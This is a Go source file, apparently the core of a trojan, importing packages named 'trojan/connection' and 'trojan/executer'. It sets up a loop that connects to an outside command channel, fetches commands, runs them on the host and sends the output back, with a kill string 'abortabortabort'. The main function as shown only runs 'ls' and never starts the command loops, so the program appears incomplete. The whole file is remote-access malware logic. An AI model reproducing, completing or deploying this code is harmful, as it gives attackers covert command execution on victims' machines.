package main

import (
	"fmt"
	"trojan/connection"
	"trojan/executer"
)

var cmdChan = make(chan string)
var resChan = make(chan []byte)
var doneChan = make(chan struct{})

func recvCmdSendRes() {
	for true {
		// 从管道中读取命令
		cmd := <-cmdChan
		// 执行命令
		if cmd == "abortabortabort" {
			doneChan <- struct{}{}
			return
		}
		res, err := executer.DoCommand(cmd, []string{}, 2)
		if err != nil {
			panic(err)
		}
		// 将结果发送到管道中
		resChan <- res
	}
}

func sendResRecvCmd() {
	client, err := connection.ConnectToChain()
	if err != nil {
		panic(err)
	}
	for true {
		res := <-resChan
		err := connection.SendResult(client, res)
		if err != nil {
			panic(err)
		}
		cmd, err := connection.GetCommand(client)
		if err != nil {
			panic(err)
		}
		cmdChan <- cmd
	}
}

func main() {
	res, err := executer.DoCommand("ls", []string{}, 2)
	if err != nil {
		panic(err)
	}
	fmt.Println(string(res))
	<-doneChan
}
